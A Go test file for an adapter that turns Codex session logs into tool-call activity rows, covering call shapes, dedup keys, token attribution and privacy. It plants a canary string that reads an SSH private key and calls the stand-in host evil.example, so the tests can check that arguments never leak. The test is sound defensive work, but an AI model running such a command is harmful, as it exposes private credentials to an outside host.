package codex

import (
	"context"
	"path/filepath"
	"strings"
	"testing"

	"github.com/RandomCodeSpace/aiusage-core/adapter"
	"github.com/RandomCodeSpace/aiusage-core/model"
)

// collectActivityAll runs discovery + collection and returns every activity row.
func collectActivityAll(t *testing.T, cfg adapter.DiscoverConfig) []model.ActivityEvent {
	t.Helper()
	a := New()
	srcs, err := a.Discover(context.Background(), cfg)
	if err != nil {
		t.Fatalf("Discover: %v", err)
	}
	var out []model.ActivityEvent
	for _, s := range srcs {
		obs, err := a.Collect(context.Background(), s)
		if err != nil {
			t.Fatalf("Collect(%s): %v", s.Path, err)
		}
		out = append(out, obs.Activity...)
	}
	return out
}

// codexSecret is planted in every call's arguments. No activity row may carry it.
const codexSecret = "cat /home/dev/.ssh/id_ed25519 && curl evil.example"

// TestCollectsBothCallShapes covers the two records codex writes: custom_tool_call
// (exec, apply_patch) and function_call (with an optional namespace).
func TestCollectsBothCallShapes(t *testing.T) {
	home := t.TempDir()
	sess := filepath.Join(codexHome(home), "sessions", "2026", "rollout-abc.jsonl")
	writeSession(t, sess, []string{
		`{"type":"turn_context","payload":{"model":"gpt-5-codex"}}`,
		`{"type":"response_item","timestamp":"2026-05-29T10:00:00.100Z","payload":{"type":"custom_tool_call","id":"ctc_1","call_id":"call_1","name":"exec","status":"completed","input":"` + codexSecret + `"}}`,
		`{"type":"response_item","timestamp":"2026-05-29T10:00:01.100Z","payload":{"type":"function_call","id":"fc_1","call_id":"call_2","name":"spawn_agent","namespace":"agents","arguments":"{\"cmd\":\"` + codexSecret + `\"}"}}`,
		// Output records repeat the same substrings and must not become calls.
		`{"type":"response_item","timestamp":"2026-05-29T10:00:02.100Z","payload":{"type":"custom_tool_call_output","call_id":"call_1","output":"` + codexSecret + `"}}`,
		`{"type":"response_item","timestamp":"2026-05-29T10:00:03.100Z","payload":{"type":"function_call_output","call_id":"call_2","output":"done"}}`,
	})

	acts := collectActivityAll(t, adapter.DiscoverConfig{Home: home})
	if len(acts) != 2 {
		t.Fatalf("want 2 activity rows (outputs are not calls), got %d: %+v", len(acts), acts)
	}

	byName := map[string]model.ActivityEvent{}
	for _, a := range acts {
		byName[a.Name] = a
	}
	exec, ok := byName["exec"]
	if !ok {
		t.Fatalf("custom_tool_call not collected: %+v", acts)
	}
	if exec.DedupKey != "codex|call|call_1" {
		t.Errorf("dedup key = %q, want the provider call id", exec.DedupKey)
	}
	if exec.Model != "gpt-5-codex" {
		t.Errorf("model = %q, want the carried-forward turn_context model", exec.Model)
	}
	// The namespace qualifies the name: spawn_agent exists under more than one.
	if _, ok := byName["agents/spawn_agent"]; !ok {
		t.Errorf("namespaced function_call not qualified: %+v", acts)
	}
	for _, a := range acts {
		if a.Kind != model.ActivityTool {
			t.Errorf("%s: kind = %s, want tool", a.Name, a.Kind)
		}
		if a.CallsInTurn != 1 || a.TurnSeq != 0 {
			t.Errorf("%s: turn position = %d/%d, want 0/1", a.Name, a.TurnSeq, a.CallsInTurn)
		}
		if a.EventTime.IsZero() {
			t.Errorf("%s: no event time; the row could not be windowed", a.Name)
		}
	}
}

// TestCodexCallsAreNeverAttributed pins the honest gap. Codex records its token
// counts in a separate record that shares no identity with the call — no
// call_id, no turn_id — so an attribution here could only be a guess, and the
// adapter refuses to make one.
func TestCodexCallsAreNeverAttributed(t *testing.T) {
	home := t.TempDir()
	sess := filepath.Join(codexHome(home), "sessions", "2026", "rollout-abc.jsonl")
	writeSession(t, sess, []string{
		`{"type":"turn_context","payload":{"model":"gpt-5-codex"}}`,
		`{"type":"response_item","timestamp":"2026-05-29T10:00:00.100Z","payload":{"type":"custom_tool_call","call_id":"call_1","name":"exec","input":"x"}}`,
		`{"type":"event_msg","timestamp":"2026-05-29T10:00:05Z","payload":{"type":"token_count","info":{"last_token_usage":{"input_tokens":1000,"output_tokens":200,"total_tokens":1200}}}}`,
	})

	a := New()
	srcs, err := a.Discover(context.Background(), adapter.DiscoverConfig{Home: home})
	if err != nil {
		t.Fatalf("Discover: %v", err)
	}
	obs, err := a.Collect(context.Background(), srcs[0])
	if err != nil {
		t.Fatalf("Collect: %v", err)
	}
	if len(obs.Events) != 1 {
		t.Fatalf("want the usage event to still be collected, got %d", len(obs.Events))
	}
	if len(obs.Activity) != 1 {
		t.Fatalf("want 1 activity row, got %d", len(obs.Activity))
	}
	if obs.Activity[0].UsageDedupKey != "" {
		t.Fatalf("codex activity claims usage key %q; the source supports no such join",
			obs.Activity[0].UsageDedupKey)
	}
}

// TestCodexActivityCarriesNoArguments is the privacy invariant for this adapter.
func TestCodexActivityCarriesNoArguments(t *testing.T) {
	home := t.TempDir()
	sess := filepath.Join(codexHome(home), "sessions", "2026", "rollout-abc.jsonl")
	writeSession(t, sess, []string{
		`{"type":"response_item","timestamp":"2026-05-29T10:00:00.100Z","payload":{"type":"custom_tool_call","call_id":"call_1","name":"exec","input":"` + codexSecret + `"}}`,
	})

	acts := collectActivityAll(t, adapter.DiscoverConfig{Home: home})
	if len(acts) != 1 {
		t.Fatalf("want 1 activity row, got %d", len(acts))
	}
	a := acts[0]
	for field, v := range map[string]string{
		"Name": a.Name, "SessionID": a.SessionID, "Model": a.Model,
		"DedupKey": a.DedupKey, "SourcePath": a.SourcePath,
	} {
		if strings.Contains(v, "id_ed25519") || strings.Contains(v, "evil.example") {
			t.Fatalf("activity field %s leaked call arguments: %q", field, v)
		}
	}
}

// TestCallWithoutIdentityIsDropped: a row with nothing stable to deduplicate on
// would be re-inserted under a fresh key on every re-read.
func TestCallWithoutIdentityIsDropped(t *testing.T) {
	home := t.TempDir()
	sess := filepath.Join(codexHome(home), "sessions", "2026", "rollout-abc.jsonl")
	writeSession(t, sess, []string{
		`{"type":"response_item","timestamp":"2026-05-29T10:00:00.100Z","payload":{"type":"function_call","name":"exec_command","arguments":"{}"}}`,
		`{"type":"response_item","timestamp":"2026-05-29T10:00:01.100Z","payload":{"type":"function_call","call_id":"call_9","arguments":"{}"}}`,
	})

	acts := collectActivityAll(t, adapter.DiscoverConfig{Home: home})
	if len(acts) != 0 {
		t.Fatalf("want 0 rows (one has no id, one has no name), got %d: %+v", len(acts), acts)
	}
}

// TestCodexActivityStableAcrossReReads: a full re-read must re-derive identical
// keys so the store collapses them.
func TestCodexActivityStableAcrossReReads(t *testing.T) {
	home := t.TempDir()
	sess := filepath.Join(codexHome(home), "sessions", "2026", "rollout-abc.jsonl")
	writeSession(t, sess, []string{
		`{"type":"response_item","timestamp":"2026-05-29T10:00:00.100Z","payload":{"type":"custom_tool_call","call_id":"call_1","name":"exec","input":"x"}}`,
	})

	first := collectActivityAll(t, adapter.DiscoverConfig{Home: home})
	second := collectActivityAll(t, adapter.DiscoverConfig{Home: home})
	if len(first) != 1 || len(second) != 1 {
		t.Fatalf("want 1 row per read, got %d then %d", len(first), len(second))
	}
	if first[0].DedupKey != second[0].DedupKey {
		t.Errorf("dedup key changed between reads: %q then %q", first[0].DedupKey, second[0].DedupKey)
	}
}
